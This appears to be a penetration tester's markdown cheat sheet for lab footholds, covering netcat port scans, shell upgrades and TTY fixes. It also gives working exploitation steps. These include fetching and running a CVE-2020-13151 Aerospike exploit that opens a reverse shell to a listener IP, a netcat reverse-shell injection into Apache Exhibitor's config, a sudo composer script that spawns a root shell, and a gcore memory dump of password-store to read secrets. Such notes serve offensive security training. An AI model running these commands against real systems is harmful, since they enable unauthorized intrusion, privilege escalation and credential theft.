# Shell Stabilization

Shell upgrade, TTY fixes, interactive session improvements, and quick port/probe helpers for unstable or limited Linux footholds.

## ==USE PENELOPE==

## Port Scanning (TCP)

```bash
nc -nvv -w 1 -z <IP> <portrange1>-<portrange2>
```

Port 3003 - cgms
```bash
nc -nv $IP 3003 #run this

help #run this

version #run this

sudo apt-get update

sudo apt-get install python3-venv

python3 -m venv myenv

source myenv/bin/activate

pip3 install aerospike

wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443

nc -nlvp 443
```

- Laravel Exploit - https://github.com/joshuavanderpoll/CVE-2021-3129
	- `APP_DEBUG` enabled
	- Laravel <= 8.4.3
	- Careful with `"` usage and try all types of revshells
* may need to switch users <-- and -->
* ALWAYS `linpeas` then `pspy64` BEFORE any exploits
```bash
#skunk got no write access to lavita folder, hence back to www-data shell
cp composer.json composer.json.bak
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
#back to skunk shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```
- ALWAYS upgrade shell even if it doesn't look like it is needed...

* Apache Exhibitor Zookeeper v1 exploit
	* `$(/bin/nc -e /bin/sh 192.168.45.234 4444 &)` --- Config Tab then Commit > All at once > Ok
	* https://www.exploit-db.com/exploits/48654
* `sudo -l` = `NOPASSWD` for `gcore`
	* `sudo gcore 494`
		* This PID is not fluctuating and is for `password-store`
	* `strings core.494`
		* https://gtfobins.github.io/gtfobins/gcore/#sudo
		* https://github.com/mikes-hacks/mxhelp/blob/main/mxlinenum

## Spawn TTY

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Full TTY (BETTER USE [PENELOPE](https://github.com/brightio/penelope))

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ls='ls -arlht --color=auto'
stty columns 200 rows 200
```

## Exploitation

- Upgrade shells
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
---

## Upgrading Shells

```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

or

```
Ctrl + z
stty -a
stty raw -echo;fg
Enter
Enter
stty rows 37 cols 123
export TERM=xterm-256color
bash
```

Alternatively:

```
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

## Oneliner

```
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
```
env reset
```

or

```
stty onlcr
```
